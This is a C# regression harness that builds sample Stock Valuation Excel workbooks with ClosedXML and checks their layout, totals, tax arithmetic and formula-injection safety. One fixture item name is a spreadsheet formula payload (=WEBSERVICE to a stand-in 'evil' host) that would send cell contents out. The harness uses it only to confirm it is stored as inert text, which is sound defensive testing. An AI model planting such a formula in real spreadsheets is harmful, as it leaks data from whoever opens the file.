using System.IO.Compression;
using System.Text.RegularExpressions;
using ClosedXML.Excel;
using MyApp.Api.DTOs;
using MyApp.Api.Helpers;

// ─────────────────────────────────────────────────────────────────────────────
// Offline regression harness for the Stock dashboard Excel export.
//
// Why offline: the workbook's contract is a LAYOUT — collapsed outline groups,
// column alignment between the two row shapes, nothing clipped, totals that tie
// to the rows above them. None of that needs a database, and a bug in it shows
// up as a plausible-looking sheet rather than an error, so it has to be asserted
// rather than eyeballed.
//
//   cd scripts/stock_export_harness && dotnet run -c Release
//
// Writes the sample workbooks next to the binary (--out <dir> to place them
// elsewhere) so a failure can be opened and looked at.
// ─────────────────────────────────────────────────────────────────────────────

var outDir = ".";
for (var i = 0; i < args.Length - 1; i++)
    if (args[i] is "--out" or "-o") outDir = args[i + 1];
Directory.CreateDirectory(outDir);

var pass = 0;
var fail = 0;

void Check(string name, bool ok, string? detail = null)
{
    if (ok) { pass++; Console.WriteLine($"  [PASS] {name}"); }
    else { fail++; Console.WriteLine($"  [FAIL] {name}{(detail is null ? "" : "   — " + detail)}"); }
}

// ── Fixtures ────────────────────────────────────────────────────────────────
// Deliberately awkward: a name past the column cap, a formula-looking name, a
// long note, seven-figure money, an item at zero stock, and an item with no
// movements at all (so it must produce no group).

const string LongName = "MEKO FABRICS PREMIUM DENIM ROLL 58 INCH WIDE INDIGO SHADE 04";
const string EvilName = "=WEBSERVICE(\"http://evil/?x=\"&A1)";
const string LongNote = "Purchase Bill #900002 — goods received against PO 44112 for the "
                      + "Karachi warehouse, three pallets short and reconciled on the "
                      + "following delivery note dated 19-02-2026";

static StockExportItemDto Item(
    int id, string name, string? hs, string uom,
    decimal opening, decimal totalIn, decimal totalOut, decimal onHand,
    decimal excl, decimal rate, DateTime? last, List<StockMovementRowDto> movements)
{
    var tax = Math.Round(excl * rate / 100m, 2, MidpointRounding.AwayFromZero);
    return new StockExportItemDto
    {
        Summary = new StockOnHandRowDto
        {
            ItemTypeId = id,
            ItemTypeName = name,
            HSCode = hs,
            UOM = uom,
            OpeningBalance = opening,
            TotalIn = totalIn,
            TotalOut = totalOut,
            OnHand = onHand,
            ValueExcludingTax = excl,
            SalesTaxRate = rate,
            SalesTax = tax,
            ValueIncludingTax = excl + tax,
            UnitCost = onHand > 0 ? Math.Round(excl / onHand, 4, MidpointRounding.AwayFromZero) : 0m,
            LastMovementAt = last,
        },
        Movements = movements,
    };
}

static List<StockMovementRowDto> Movements(int itemId, string itemName, int count, bool withLongNote)
{
    var rows = new List<StockMovementRowDto>();
    var day = new DateTime(2026, 1, 5);
    decimal qty = 0, value = 0;
    for (var m = 0; m < count; m++)
    {
        var isIn = m % 3 != 2;
        var moved = 10m + m * 2.25m;
        var unit = 1200.5555m + m;
        var amount = Math.Round(moved * unit, 2, MidpointRounding.AwayFromZero);
        qty += isIn ? moved : -moved;
        value += isIn ? amount : -amount;
        rows.Add(new StockMovementRowDto
        {
            Id = itemId * 1000 + m,
            ItemTypeId = itemId,
            ItemTypeName = itemName,
            Direction = isIn ? "In" : "Out",
            Quantity = moved,
            SourceType = isIn ? "PurchaseBill" : "Invoice",
            SourceId = 400 + m,
            SourceDocNumber = (900001 + m).ToString(),
            MovementDate = day.AddDays(m * 4),
            Notes = withLongNote && m == 1 ? LongNote : null,
            UnitCost = unit,
            Value = amount,
            RunningQuantity = qty,
            RunningValue = value,
        });
    }
    return rows;
}

var items = new List<StockExportItemDto>
{
    Item(1, LongName,           "8536.5010", "Pcs", 50m, 500m, 450m, 100m,    1_234_567.89m, 18m, new DateTime(2026, 2, 19), Movements(1, LongName, 5, true)),
    Item(2, EvilName,           "7318.1510", "KG",  51m, 510m, 460m, 137.5m,  1_333_333.32m, 25m, new DateTime(2026, 3, 4),  Movements(2, EvilName, 4, false)),
    Item(3, "Bearing 6204 ZZ",  "8482.1000", "Pcs", 52m, 520m, 470m, 175m,    1_432_098.75m, 18m, new DateTime(2026, 3, 21), Movements(3, "Bearing 6204 ZZ", 7, false)),
    Item(4, "Zero Stock Widget","8513.1090", "Pcs", 54m, 540m, 540m, 0m,      0m,            18m, new DateTime(2026, 4, 2),  Movements(4, "Zero Stock Widget", 3, false)),
    Item(5, "No Movement Item", null,        "KG",  55m,   0m,   0m, 55m,       98_765.43m, 25m, null,                       new List<StockMovementRowDto>()),
};

StockExportDto Data(bool includeMovements) => new()
{
    CompanyName = "Hakimi Traders",
    Title = "Stock Valuation Report",
    GeneratedAt = new DateTime(2026, 9, 4, 16, 42, 0),
    FiltersApplied = includeMovements
        ? new List<string> { "As at 04-09-2026" }
        : new List<string> { "As at 04-09-2026", "Movement detail omitted" },
    IncludeMovements = includeMovements,
    Items = items.Select(i => new StockExportItemDto
    {
        Summary = i.Summary,
        Movements = includeMovements ? i.Movements : new List<StockMovementRowDto>(),
    }).ToList(),
};

var detailPath = Path.Combine(outDir, "stock-export-with-movements.xlsx");
var summaryPath = Path.Combine(outDir, "stock-export-summary-only.xlsx");
File.WriteAllBytes(detailPath, StockExcelBuilder.Build(Data(true)));
File.WriteAllBytes(summaryPath, StockExcelBuilder.Build(Data(false)));

// ── Suite 1: the drill-down ──────────────────────────────────────────────────

Console.WriteLine("\n=== 1. Drill-down: every item's movements nested and CLOSED ===");
{
    using var wb = new XLWorkbook(detailPath);
    var ws = wb.Worksheet(1);

    var detailRows = ws.RowsUsed().Where(r => r.OutlineLevel > 0).ToList();
    Check("movement rows are outlined", detailRows.Count > 0, $"{detailRows.Count} rows");
    Check("every outlined row starts hidden (collapsed)",
        detailRows.All(r => r.IsHidden), $"{detailRows.Count(r => !r.IsHidden)} left visible");

    // 5 + 4 + 7 + 3 movements, plus one sub-header per grouped item (4 items;
    // the fifth has no movements and must therefore get no group at all).
    Check("group row count = movements + one sub-header per grouped item",
        detailRows.Count == (5 + 4 + 7 + 3) + 4, $"got {detailRows.Count}");

    // The summary row must sit ABOVE its detail, or the +/- lands on the wrong
    // row and the item that opens is not the one you clicked.
    Check("outline summary sits above the group",
        ws.Outline.SummaryVLocation == XLOutlineSummaryVLocation.Top,
        ws.Outline.SummaryVLocation.ToString());

    var noMovementRow = ws.RowsUsed()
        .First(r => r.Cell(1).GetString() == "No Movement Item");
    Check("an item with no movements gets no group",
        ws.Row(noMovementRow.RowNumber() + 1).OutlineLevel == 0);

    // ClosedXML 0.104.2 files the row depth under outlineLevelCol and never
    // writes outlineLevelRow; StockExcelBuilder corrects that on save. If this
    // regresses, Excel is told the sheet has a column outline it does not have.
    var sheetXml = ReadSheetXml(detailPath);
    var formatPr = Regex.Match(sheetXml, @"<[A-Za-z0-9]*:?sheetFormatPr\b[^>]*>").Value;
    Check("saved part declares outlineLevelRow", formatPr.Contains("outlineLevelRow=\"1\""), formatPr);
    Check("saved part declares no phantom column outline",
        !formatPr.Contains("outlineLevelCol"), formatPr);
}

// ── Suite 2: nothing is cut off ──────────────────────────────────────────────

Console.WriteLine("\n=== 2. Every value fits its cell ===");
foreach (var path in new[] { detailPath, summaryPath })
{
    using var wb = new XLWorkbook(path);
    var ws = wb.Worksheet(1);
    var label = Path.GetFileName(path);

    var merged = ws.MergedRanges
        .SelectMany(r => r.Cells())
        .Select(c => c.Address.ToString())
        .ToHashSet(StringComparer.OrdinalIgnoreCase);

    var clipped = new List<string>();
    foreach (var cell in ws.CellsUsed())
    {
        if (merged.Contains(cell.Address.ToString()!)) continue;   // banner spans 14 columns
        if (cell.Style.Alignment.WrapText) continue;               // wraps instead of clipping
        var text = cell.GetFormattedString();
        if (string.IsNullOrEmpty(text)) continue;
        var need = text.Length + cell.Style.Alignment.Indent;
        var width = ws.Column(cell.Address.ColumnNumber).Width;
        if (need > width)
            clipped.Add($"{cell.Address} needs {need} has {width:F1}: {Trim(text)}");
    }
    Check($"{label}: no clipped cell", clipped.Count == 0, string.Join(" | ", clipped.Take(4)));

    // The two long free-text fields are the ones that cannot be sized away, so
    // they must be the ones that wrap.
    var nameCell = ws.CellsUsed().FirstOrDefault(c => c.GetString() == LongName);
    Check($"{label}: long item name wraps", nameCell?.Style.Alignment.WrapText == true);
}

// ── Suite 3: the figures, and that they tie ──────────────────────────────────

Console.WriteLine("\n=== 3. Columns and totals ===");
{
    using var wb = new XLWorkbook(detailPath);
    var ws = wb.Worksheet(1);

    string[] expected =
    {
        "Item", "HS Code", "UOM", "Opening", "Total In", "Total Out", "On Hand",
        "Unit Cost", "Excluding", "Tax Rate", "Sales Tax", "Including",
        "Last Movement", "Notes",
    };
    var headerRow = ws.RowsUsed().First(r => r.Cell(1).GetString() == "Item").RowNumber();
    for (var c = 0; c < expected.Length; c++)
        Check($"header column {c + 1} is \"{expected[c]}\"",
            ws.Cell(headerRow, c + 1).GetString() == expected[c],
            ws.Cell(headerRow, c + 1).GetString());

    Check("header row is frozen", ws.SheetView.SplitRow == headerRow, ws.SheetView.SplitRow.ToString());
    Check("item-name column is frozen", ws.SheetView.SplitColumn == 1, ws.SheetView.SplitColumn.ToString());
    Check("header repeats on every printed page",
        ws.PageSetup.FirstRowToRepeatAtTop == headerRow, ws.PageSetup.FirstRowToRepeatAtTop.ToString());

    var totalRow = ws.RowsUsed().First(r => r.Cell(1).GetString().StartsWith("TOTAL")).RowNumber();
    // Sum the ITEM rows only: an outlined row is a movement and must not be
    // counted, or the total would double every figure it explains.
    var itemRows = ws.RowsUsed()
        .Where(r => r.RowNumber() > headerRow && r.RowNumber() < totalRow && r.OutlineLevel == 0)
        .ToList();
    Check("one row per item above the total", itemRows.Count == items.Count, itemRows.Count.ToString());

    foreach (var (col, name) in new[] { (4, "Opening"), (5, "Total In"), (6, "Total Out"), (7, "On Hand"), (9, "Excluding"), (11, "Sales Tax"), (12, "Including") })
    {
        var summed = itemRows.Sum(r => r.Cell(col).GetValue<decimal>());
        var stated = ws.Cell(totalRow, col).GetValue<decimal>();
        Check($"TOTAL {name} ties to the rows above", summed == stated, $"rows {summed} vs total {stated}");
    }

    // A weighted average and a percentage do not add up, so those two columns
    // must stay EMPTY on the total row rather than showing a nonsense sum.
    Check("TOTAL leaves Unit Cost blank", ws.Cell(totalRow, 8).IsEmpty());
    Check("TOTAL leaves Tax Rate blank", ws.Cell(totalRow, 10).IsEmpty());

    // Sales tax and the inclusive total are DERIVED, and the sheet has to keep
    // that identity or it contradicts the dashboard it was taken from.
    foreach (var r in itemRows)
    {
        var excl = r.Cell(9).GetValue<decimal>();
        var rate = r.Cell(10).GetValue<decimal>();
        var tax = r.Cell(11).GetValue<decimal>();
        var incl = r.Cell(12).GetValue<decimal>();
        var derived = Math.Round(excl * rate / 100m, 2, MidpointRounding.AwayFromZero);
        Check($"\"{Trim(r.Cell(1).GetString(), 28)}\": tax = excluding x rate / 100",
            tax == derived && incl == excl + tax, $"{excl} @ {rate}% -> {tax} / {incl}");
    }
}

// ── Suite 4: movement rows line up with the item columns ─────────────────────

Console.WriteLine("\n=== 4. Movement rows share the item grid ===");
{
    using var wb = new XLWorkbook(detailPath);
    var ws = wb.Worksheet(1);

    var subHeader = ws.RowsUsed().First(r => r.OutlineLevel > 0 && r.Cell(1).GetString() == "Date");
    var expectPairs = new[]
    {
        (1, "Date"), (2, "Document"), (3, "Direction"), (5, "Qty In"), (6, "Qty Out"),
        (7, "Balance"), (8, "Unit Cost"), (9, "Value"), (12, "Running Value"), (14, "Notes"),
    };
    foreach (var (col, text) in expectPairs)
        Check($"sub-header column {col} is \"{text}\"",
            subHeader.Cell(col).GetString() == text, subHeader.Cell(col).GetString());
    Check("sub-header leaves the Opening column empty", subHeader.Cell(4).IsEmpty());

    var firstMove = ws.Row(subHeader.RowNumber() + 1);
    Check("an IN movement fills Qty In and leaves Qty Out empty",
        !firstMove.Cell(5).IsEmpty() && firstMove.Cell(6).IsEmpty());
    Check("source type reads as words, not an enum name",
        firstMove.Cell(2).GetString().StartsWith("Purchase Bill #"), firstMove.Cell(2).GetString());

    var outMove = ws.RowsUsed().First(r => r.OutlineLevel > 0 && r.Cell(3).GetString() == "OUT");
    Check("an OUT movement fills Qty Out and leaves Qty In empty",
        !outMove.Cell(6).IsEmpty() && outMove.Cell(5).IsEmpty());
    Check("movement quantities are unsigned — the direction carries the sign",
        outMove.Cell(6).GetValue<decimal>() > 0m, outMove.Cell(6).GetString());
}

// ── Suite 5: safety and the summary-only variant ─────────────────────────────

Console.WriteLine("\n=== 5. Injection safety, and the no-permission variant ===");
{
    var sheetXml = ReadSheetXml(detailPath);
    Check("workbook contains no formula at all", !Regex.IsMatch(sheetXml, @"<[A-Za-z0-9]*:?f[ >]"));

    using var wb = new XLWorkbook(detailPath);
    var ws = wb.Worksheet(1);
    var evil = ws.CellsUsed().FirstOrDefault(c => c.GetString() == EvilName);
    Check("a formula-looking item name is stored as TEXT", evil is not null && evil.DataType == XLDataType.Text);
    Check("a formula-looking item name is quote-prefixed", evil?.Style.IncludeQuotePrefix == true);

    using var wb2 = new XLWorkbook(summaryPath);
    var ws2 = wb2.Worksheet(1);
    Check("summary-only workbook has no groups", ws2.RowsUsed().All(r => r.OutlineLevel == 0));
    var legend = string.Join(" ", ws2.RowsUsed().Select(r => r.Cell(1).GetString()));
    Check("summary-only workbook says why detail is missing",
        legend.Contains("Movement detail is not included"), Trim(legend, 90));
    Check("summary-only workbook still totals", legend.Contains("TOTAL"));
}

Console.WriteLine($"\n=== {pass}/{pass + fail} checks passed ===");
if (fail > 0)
{
    Console.WriteLine($"{fail} FAILING CHECK(S). Sample workbooks written to {Path.GetFullPath(outDir)}");
    return 1;
}
Console.WriteLine("STOCK EXPORT HARNESS PASSED");
return 0;

static string ReadSheetXml(string path)
{
    using var zip = ZipFile.OpenRead(path);
    var entry = zip.Entries.First(e => e.FullName.StartsWith("xl/worksheets/", StringComparison.Ordinal)
                                    && e.FullName.EndsWith(".xml", StringComparison.Ordinal));
    using var reader = new StreamReader(entry.Open());
    return reader.ReadToEnd();
}

static string Trim(string s, int max = 48) => s.Length <= max ? s : s[..max] + "…";
